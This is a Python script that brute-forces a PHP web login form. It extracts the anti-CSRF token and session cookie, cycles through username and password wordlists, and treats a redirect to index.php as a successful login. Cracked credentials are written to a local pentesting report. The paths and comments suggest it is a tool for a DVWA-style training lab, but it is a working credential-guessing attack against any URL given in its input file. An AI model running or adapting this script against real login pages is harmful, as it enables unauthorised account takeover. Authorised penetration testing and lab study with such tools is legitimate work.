#!/usr/bin/python

import requests
import sys
import re
from bs4 import BeautifulSoup
import json
###################################
#Fetching inputs from JSON file
###################################
with open("input.json") as jsonFile:
    jsonObject = json.load(jsonFile)
    jsonFile.close()

url = jsonObject['url']

####################################

# Variables
target = url
user_list = 'usernames.txt'
pass_list = 'passwords.txt'


# Value to look for in response header (Whitelisting)
success = 'index.php'


# Get the anti-CSRF token
def csrf_token():
    try:
        # Make the request to the URL
        print ("\n[i] URL: %s/login.php" % target)
        r = requests.get("{0}/login.php".format(target), allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print ("\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))
        sys.exit(-1)

    # Extract anti-CSRF token
    soup = BeautifulSoup(r.text,features='lxml')
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    print ("[i] user_token: %s" % user_token)

    # Extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    print ("[i] session_id: %s\n" % session_id)

    return session_id, user_token


# Make the request to-do the brute force
def url_request(username, password, session_id, user_token):
    # POST data
    data = {
        "username": username,
        "password": password,
        "user_token": user_token,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id
    }

    try:
        # Make the request to the URL
        #print "\n[i] URL: %s/vulnerabilities/brute/" % target
        #print "[i] Data: %s" % data
        #print "[i] Cookie: %s" % cookie
        r = requests.post("{0}/login.php".format(target), data=data, cookies=cookie, allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print ("\n\n[!] url_request: Failed to connect (URL: %s/vulnerabilities/brute/).\n[i] Quitting." % (target))
        sys.exit(-1)

    # Wasn't it a redirect?
    if r.status_code != 301 and r.status_code != 302:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print ("\n\n[!] url_request: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))
        sys.exit(-1)

    # We have what we need
    return r.headers["Location"]


# Main brute force loop
def brute_force(user_token, session_id):
    # Load in wordlists files
    with open(pass_list) as password:
        password = password.readlines()
    with open(user_list) as username:
        username = username.readlines()

    # Counter
    i = 0

    # Loop around
    for PASS in password:
        for USER in username:
            USER = USER.rstrip('\n')
            PASS = PASS.rstrip('\n')

            # Increase counter
            i += 1

            # Feedback for the user
            print ("[i] Try %s: %s // %s" % (i, USER, PASS))

            # Fresh CSRF token each time?
            #user_token, session_id = csrf_token()

            # Make request
            attempt = url_request(USER, PASS, session_id, user_token)
            #print attempt

            # Check response
            if attempt == success:
                print ("\n\n[i] Found!")
                print ("[i] Username: %s" % (USER))
                print ("[i] Password: %s" % (PASS))
                f = open("/home/chandana/Pentesting/report.txt", "a")
                f.write("\n")
                f.write("#"*100)
                f.write("\n** PASSWORD CRACKING **\n")
                f.write("\nTarget: ")
                f.write(target)
                f.write("\n")
                f.write(" Username: %s \n" % (USER))
                f.write(" Password: %s \n" % (PASS))
                f.write("#"*100)
                f.write("\n")

                f.close()
                return True
             
    return False
